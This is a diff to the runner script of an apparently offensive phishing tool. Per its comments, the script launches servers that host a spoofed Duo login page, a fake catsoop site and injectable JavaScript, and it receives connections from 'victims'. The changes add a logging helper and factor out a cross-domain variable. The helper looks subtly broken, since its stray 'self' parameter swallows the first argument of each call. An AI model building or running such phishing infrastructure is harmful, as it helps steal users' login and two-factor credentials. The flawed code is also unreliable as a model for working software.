@@ -25,6 +25,9 @@ try:
 except:
     print("Cannot open config.ini. Did you run confingure.py?")
 
+def log(self, *args):
+    print("[*] RUNNER\t\t" + " ".join(map(str,args)))
+
 # Function to fetch a list of possible ipv4 addresses this 
 # machine can bind to
 def ip4_addresses():
@@ -53,12 +56,12 @@ if len(sys.argv) == 1:
 else:
     host = sys.argv[1]
 
-print("Localhost is", host)
+log("Localhost is", host)
 
 # Initialize the socket server that will listen on 80 for 
 # incoming websocket tcp connections from victims and backend
 # docker containers 
-print("Starting backend server...")
+log("Starting backend server...")
 socket_server = SocketServer(
     host,           # localhost ip
     attacker_dom,   # domain that points to localhost ip
@@ -68,13 +71,16 @@ socket_server = SocketServer(
 # injectable js code, the spoofed duo login site, and the 
 # fake entrance / exit catsoop site. Started on separate
 # thread for perforamnce and non-blocking output
-print("Starting https server on port 443...")
+log("Starting https server on port 443...")
+
+crossdomain = "https://" + phishing_url   \
+                .split("//")[1].split("/")[0]
+log("Allowing {} as cross domain".format(crossdomain))
 threading.Thread(target=https_server.start_server,
         args=(host,                     # localhost
             attacker_dom,               # points to here
-            "https://" + phishing_url   # cross domain
-                .split("//")[-1].split("/")[0],
-            socket_server)).start()
+            crossdomain,
+           socket_server)).start()
 
 # Finally start the socket server
 socket_server.start_server()
